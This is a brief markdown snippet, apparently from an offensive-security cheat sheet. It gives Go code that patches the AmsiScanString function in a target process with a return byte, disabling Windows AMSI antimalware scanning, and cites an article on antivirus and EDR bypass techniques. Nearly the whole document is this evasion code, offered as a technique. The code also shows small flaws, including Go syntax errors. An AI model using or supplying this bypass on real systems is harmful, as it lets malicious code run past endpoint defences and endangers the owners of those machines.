# Go

```go
pid := uint32(<PID>)
amsidll, _ := syscall.LoadLibrary("amsi.dll")
amsiScanString, _ := syscall.GetProcAddress(amsidll, "AmsiScanString")
patch := []byte{0xc3}

pHandle := windows.OpenProcess(
	windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION,
	false,
	pid
)

var numberOfBytesWritten uintptr
err := windows.WriteProcessMemory(
	pHandle,
	amsiScanString,
	&patch[0],
	uintptr(len(patch)),
	&numberOfBytesWritten
)
```

---
## References

### vaadata

- [vaadata: Antivirus and EDR Bypass Techniques](https://www.vaadata.com/blog/antivirus-and-edr-bypass-techniques/)